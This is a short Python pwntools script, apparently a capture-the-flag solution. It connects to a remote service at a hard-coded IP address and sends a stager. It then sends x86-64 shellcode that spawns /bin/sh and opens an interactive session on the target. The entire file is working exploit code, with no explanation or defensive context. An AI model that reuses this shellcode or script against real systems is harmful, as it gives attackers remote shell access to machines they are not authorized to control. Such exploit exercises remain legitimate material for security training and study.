from pwn import *
rhp = {'host': '153.120.129.186', 'port':20000}
conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
with open('stager', 'rb') as f:
    stager = f.read()
print(stager)
conn.sendline(stager)

shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
payload = shellcode
print(payload)

conn.sendline(payload)

conn.interactive()